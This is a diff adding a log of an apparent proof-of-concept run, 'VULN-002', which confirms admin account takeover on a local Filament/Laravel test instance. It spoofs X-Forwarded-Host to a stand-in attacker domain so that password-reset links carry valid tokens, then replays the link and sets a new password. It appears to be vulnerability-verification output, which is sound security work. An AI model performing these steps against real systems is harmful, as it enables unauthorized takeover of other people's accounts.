@@ -1,0 +1,22 @@
+========================================================================
+VULN-002: Password-reset Host-header poisoning -> account takeover
+target: http://localhost:20000
+[INFO] exercising vulnerable code path: Filament passwordReset URL from request host + trustProxies('*') defeats ValidateSignature
+========================================================================
+[SETUP] aligning reset-token table with shipped config: already present
+[SETUP] created victim ADMIN victim_8c6f32df@example.invalid (victim_id=8), old password known only to us
+[STEP] POST reset request for the victim with X-Forwarded-Host: evil.attacker.tld
+[INFO] reset request HTTP 200 (notification queued: yes)
+[STEP] processing the mail queue (queue:work --once) so the email is rendered to the log
+[PROOF] victim's reset email links to host 'evil.attacker.tld' (attacker-controlled) with a valid token=8069c73ead4d... and signature=ae8b03706fbe...
+[STEP] replaying the captured link to the REAL server WITHOUT the host spoof
+[INFO]   -> HTTP 403 (403 == ValidateSignature rejects the foreign-host signature)
+[STEP] replaying WITH the host spoof (X-Forwarded-Host: evil.attacker.tld)
+[INFO]   -> HTTP 200 (200 == signature recomputed over the spoofed host now matches; the check is inert)
+[STEP] submitting a NEW password through the reset form (email+token already in the form state)
+[INFO] resetPassword HTTP 200 (redirect effect: yes)
+[STEP] verifying takeover: log in as the victim with the attacker's new password
+[INFO] login with NEW password: True | login with OLD password: False
+[PROOF] logged in as the victim admin with the attacker-chosen password; the victim's original password no longer works => account taken over
+[OK] exploit confirmed — unauthenticated password-reset host poisoning yields full ATO
+==> VULN-002: CONFIRMED — X-Forwarded-Host poisons the reset link and defeats ValidateSignature -> admin ATO
